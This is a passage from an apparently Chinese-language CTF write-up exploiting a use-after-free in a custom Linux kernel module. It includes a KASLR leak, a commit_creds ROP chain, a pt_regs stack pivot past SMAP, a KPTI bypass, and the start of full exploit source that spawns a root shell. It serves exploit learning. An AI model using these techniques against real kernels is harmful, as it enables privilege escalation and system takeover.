</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;buf[%d] =&gt; 0x%llx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, j, buf[j]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    kernel_base <span style="color:#ff79c6">=</span> buf[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x20fac0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;kernel base =&gt; 0x%llx&#34;</span>, kernel_base);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    kernel_offset <span style="color:#ff79c6">=</span> kernel_base <span style="color:#ff79c6">-</span> nokaslr;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">save_status</span>(); 
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">uaf</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">leak_base</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>rop</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6272a4">// 之前的都一样
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#if 1
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span> <span style="color:#ff79c6">#define o(x) (x+kernel_offset)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>    <span style="color:#6272a4">// smep userspace地址被标记为non-executable
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// bypass: stack prviot
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">size_t</span> payload[<span style="color:#bd93f9">0x40</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> idx<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">size_t</span> user_rip <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">size_t</span>)get_shell;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">o</span>(pop_rbx_ret);
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">o</span>(commit_creds);
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">o</span>(pop_rdi_ret); <span style="color:#6272a4">// return address
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>;
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">o</span>(prepare_kernel_cred);
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">o</span>(mov_edi_eax_call_rbx);
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">o</span>(swapgs_restore_regs_and_return_to_usermode) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">22</span>; 
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>;
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>;
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> user_rip;
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> user_cs;
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> user_rflags;
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> user_rsp;
</span></span><span style="display:flex;"><span>    payload[idx<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> user_ss;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">put_mmsg</span>(fd2, (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>payload);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// trigger seq_file-&gt;start
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#50fa7b">read</span>(seq_fd, <span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>使用xchg 进行类似栈迁移的操作，从而进行劫持函数执行流</p>
<p>在本地执行时，直接kernel panic。查看报错信息，发现是<code>can't access memory in 0x????(是个用户地址)</code>。</p>
<h3 id="2">2</h3>
<p>后来看来一下这篇文章发现原因：<a href="https://blog.wingszeng.top/kernel-pwn-struct-seq-operations-and-struct-pt-regs/#%E4%BE%8B%E9%A2%98-2023-pwnhub-%E5%85%AC%E5%BC%80%E8%B5%9B-kheap">Kernel Pwn Struct seq_operations and Struct pt_regs</a></p>
<ul>
<li>这一题开启了smap，而 pwnhub 的那一题中没有。而smap: kernel space 不能 access user space 的东西。</li>
<li>这篇文章中说了一个 <code>pt_regs</code> 的结构体，在使用syscall 时，会将某些寄存器内容压入<code>内核栈的栈底</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> pt_regs {
</span></span><span style="display:flex;"><span><span style="color:#6272a4">/*
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * C ABI says these regs are callee-preserved. They aren&#39;t saved on kernel entry
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * unless syscall needs a complete, fully filled &#34;struct pt_regs&#34;.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> r15;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> r14;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> r13;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> r12;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> rbp;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> rbx;
</span></span><span style="display:flex;"><span><span style="color:#6272a4">/* These regs are callee-clobbered. Always saved on kernel entry. */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> r11;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> r10;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> r9;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> r8;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> rax;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> rcx;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> rdx;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> rsi;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> rdi;
</span></span><span style="display:flex;"><span><span style="color:#6272a4">/*
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * On syscall entry, this is syscall#. On CPU exception, this is error code.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * On hw interrupt, it&#39;s IRQ number:
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> orig_rax;
</span></span><span style="display:flex;"><span><span style="color:#6272a4">/* Return frame for iretq */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> rip;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> cs;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> eflags;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> rsp;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> ss;
</span></span><span style="display:flex;"><span><span style="color:#6272a4">/* top of stack page */</span>
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><blockquote>
<p>在系统调用的过程中, 不是所有的寄存器都会被改变, 比如 r8 - r15, 他们会在压入 pt_regs 的时保持 syscall 之前的值. 这就为我们提供了布置数据的可能性. 如果在仅能劫持 rip 的情况下 (比如上面介绍的 seq_operations), 跳转到某个形如 <code>add, rsp val; ret</code> 的 gadget, 那么就有可能将 rsp 设置到内核栈的 pt_regs 上, 从而执行我们布置的 ROP 链.</p>
</blockquote>
<p>也就是我们 rop 往 内核栈的 pt_regs 中跳转，就不会绕过了smap</p>
<p>如何将寄存器压入: 使用了巧妙地方法，syscall 调用 read，将寄存器压入，并且可以通过seq_operations-&gt;start执行rop</p>
<p>调用模板+解释的比较详细的文章：<a href="https://ywhkkx.github.io/2023/02/19/seq_operations%20+%20pt_regs/">seq_operations+pt_regs</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#50fa7b">__asm__</span>(  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov r15, 0x55555555;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov r14, 0x44444444;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov r13, 0x33333333;&#34;</span>   
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov r12, 0x22222222;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov rbp, 0xbbbb1111;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov rbx, 0xbbbb2222;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov r11, 0x11111111;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov r10, 0x11110000;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov r9,  0x99999999;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov r8,  0x88888888;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;xor rax, rax;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov rcx, 0x666666;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov rdx, 8;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov rsi, rsp;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov rdi, seq_fd;&#34;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;syscall&#34;</span>  
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>gadget: 改变rsp, add rsp, xxx; ret，进行栈迁移</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; x/2wi 0xffffffff81909b8c
</span></span><span style="display:flex;"><span>   0xffffffff81909b8c:  add    rsp,0x168
</span></span><span style="display:flex;"><span>   0xffffffff81909b93:  ret
</span></span></code></pre></div><p>但是我们需要事先知道执行start 时与pt_regs 距离多远。</p>
<p>直接使用没有布局的脚本，自然会kernel panic，可以看到rip的内容，然后与上述的payload进行对比，获得偏移</p>
<p>并且这并不是一个万能的方法</p>
<h3 id="3">3</h3>
<p>还是不对，因此再看参考文章，如下也存在uaf问题。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6272a4">// module_ioctl
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">struct</span> mmsg_head {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">char</span> description[<span style="color:#bd93f9">16</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">struct</span> list_head list;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">MMSG_RECV</span>: 
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (arg.top) {
</span></span><span style="display:flex;"><span>            m <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">list_entry</span>(<span style="color:#ff79c6">&amp;</span>mmsg_head<span style="color:#ff79c6">-&gt;</span>list, <span style="color:#ff79c6">struct</span> mmsg, list);  <span style="color:#6272a4">// head
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>            m <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">find_mmsg</span>(arg.token);   <span style="color:#6272a4">// 遍历查询
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (m <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span> <span style="color:#ff79c6">||</span> arg.size <span style="color:#ff79c6">&gt;</span> m<span style="color:#ff79c6">-&gt;</span>size <span style="color:#ff79c6">||</span> arg.size <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>            ret <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span>EINVAL;
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">printk</span>(KERN_INFO <span style="color:#f1fa8c">&#34;mmsg recv</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">copy_to_user</span>((<span style="color:#8be9fd">void</span> __user <span style="color:#ff79c6">*</span>)arg.data, m<span style="color:#ff79c6">-&gt;</span>data, arg.size);
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">list_del</span>(<span style="color:#ff79c6">&amp;</span>m<span style="color:#ff79c6">-&gt;</span>list);  <span style="color:#6272a4">// 双向链表元素内核提供的删除函数
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#50fa7b">kfree</span>(m<span style="color:#ff79c6">-&gt;</span>data);      <span style="color:#6272a4">// head 没有，但是固定偏移为 0x10 的地方，相当于free掉list，不会报错
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#50fa7b">kfree</span>(m);          
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
</span></span></code></pre></div><h3 id="4">4</h3>
<h4 id="偏移确定">偏移确定</h4>
<p>add rsp val，我们需要一个比较具体的值</p>
<p>大概是 <code>0x100+</code> 的gadget吧，不太会，但是此结构体大小大于0x100，并且要开启syscall的栈帧</p>
<ul>
<li>应该可以在ioctl 下断点，但是我失败了😥</li>
</ul>
<h4 id="执行流程">执行流程</h4>
<ul>
<li>直接看报错:  BUG: unable to handle page fault for address: 0000000044444444 ； RIP: 0010:0x44444444获得我们rip指针控制的寄存器 r14</li>
<li>syscall 不会改变 r8-r15内容。理想情况下r8-r15内容不变，但是可能会产生奇妙的变化。调试，si会走到start指针的操作，从而获得栈结构</li>
<li>假设理想化从r14-r8没有发生改变</li>
<li>si 一路走，但是看不到对应内容?</li>
</ul>
<p><a href="https://b0ldfrev.gitbook.io/note/linux_kernel/kernelpwn-zhuang-tai-qie-huan-yuan-li-ji-kpti-rao-guo#0x2-bypass-kpti">KERNEL_PWN状态切换原理及KPTI绕过</a></p>
<p>swapgs; iretq 返回用户态; ret rip,在此处没有使用ret指令，直接iretq, 直接r9为user_rsp就行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>swapgs            
</span></span><span style="display:flex;"><span>iretq             
</span></span><span style="display:flex;"><span>rsp ---&gt; rip 
</span></span><span style="display:flex;"><span>         cs
</span></span><span style="display:flex;"><span>         rflags
</span></span><span style="display:flex;"><span>         rsp
</span></span><span style="display:flex;"><span>         ss
</span></span></code></pre></div><p>swapgs_restore_regs_and_return_to_usermode: 这个比上个复杂一点，需要在迁移一次</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>swapgs_restore_regs_and_return_to_usermode + <span style="color:#bd93f9">22</span>  
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span> // padding  
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span> // padding  
</span></span><span style="display:flex;"><span>get_shell
</span></span><span style="display:flex;"><span>user_cs  
</span></span><span style="display:flex;"><span>user_rflags  
</span></span><span style="display:flex;"><span>user_sp
</span></span><span style="display:flex;"><span>user_ss
</span></span></code></pre></div><h4 id="errors">errors</h4>
<ol>
<li>qemu cpu为 <code>host</code> 也必须开启kvm, 同时就是这一点，导致我一直不成功，后来去除掉kvm将cpu改为kvm64成功。应该是本机的CPU的安全防护导致一直失败😥。</li>
</ol>
<h4 id="exploit">exploit</h4>
<p>signal bypass kpti。执行用户态的任意代码都会报出信号<code>SIGSEGV</code>，那么在程序开始时将<code>SIGSEGV</code>与shell函数绑定在一起，那么访问用户态代码时就会报出信号<code>SIGSEGV</code>，就会执行信号函数。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;errno.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;signal.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/mman.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/syscall.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/ioctl.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define COLOR_GREEN &#34;\033[32m&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define COLOR_RED &#34;\033[31m&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define COLOR_YELLOW &#34;\033[33m&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define COLOR_DEFAULT &#34;\033[0m&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define log_debug(fmt, ...)                                                    \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">  dprintf(2, &#34;[*] %s:%d &#34; fmt &#34;\n&#34;, __FILE__, __LINE__, ##__VA_ARGS__)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define log_info(fmt, ...)                                                     \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">  dprintf(2, COLOR_GREEN &#34;[+] %s:%d &#34; fmt &#34;\n&#34; COLOR_DEFAULT, __FILE__,        \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">          __LINE__, ##__VA_ARGS__)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define log_warning(fmt, ...)                                                  \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">  dprintf(2, COLOR_YELLOW &#34;[!] %s:%d &#34; fmt &#34;\n&#34; COLOR_DEFAULT, __FILE__,       \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">          __LINE__, ##__VA_ARGS__)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define log_error(fmt, ...)                                                    \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">  dprintf(2, COLOR_RED &#34;[-] %s:%d &#34; fmt &#34;\n&#34; COLOR_DEFAULT, __FILE__,          \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">          __LINE__, ##__VA_ARGS__)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define die(fmt, ...)                  \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">  do {                                 \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">    log_error(fmt, ##__VA_ARGS__);          \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">    log_error(&#34;Exit at line %d&#34;, __LINE__); \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">    exit(1);                           \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">  } while (0)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">get_shell</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">if</span>( <span style="color:#50fa7b">getuid</span>() ) {
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">die</span>(<span style="color:#f1fa8c">&#34;fail to get shell&#34;</span>);
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">log_info</span>(<span style="color:#f1fa8c">&#34;start to get root shell&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#50fa7b">system</span>(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#50fa7b">exit</span>(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> user_cs, user_ss, user_rflags, user_rsp;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">save_status</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">__asm__</span>(<span style="color:#f1fa8c">&#34;mov user_cs, cs;&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;mov user_ss, ss;&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;mov user_rsp, rsp;&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;pushf;&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;pop user_rflags;&#34;</span>
</span></span><span style="display:flex;"><span>            );
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">log_info</span>(<span style="color:#f1fa8c">&#34;status saved&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">seq_open</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> <span style="color:#8be9fd">int</span> seq;
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">if</span> ( (seq<span style="color:#ff79c6">=</span><span style="color:#50fa7b">open</span>(<span style="color:#f1fa8c">&#34;/proc/self/stat&#34;</span>, O_RDONLY)) <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">die</span>(<span style="color:#f1fa8c">&#34;seq open fail&#34;</span>);
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">return</span> seq;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define MMSG_ALLOC 0x1111111
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define MMSG_COPY 0x2222222
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define MMSG_RECV 0x3333333
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define MMSG_UPDATE 0x4444444
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define MMSG_PUT_DESC 0x5555555
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define MMSG_GET_DESC 0x6666666
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> mmsg_arg {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> token;
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> top;
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> size;
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>data;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> kernel_base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> kernel_offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> nokaslr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff81000000</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> prepare_kernel_cred <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff9248d790</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> commit_creds <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff8108d350</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> swapgs_restore_regs_and_return_to_usermode <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff93000e30</span>;
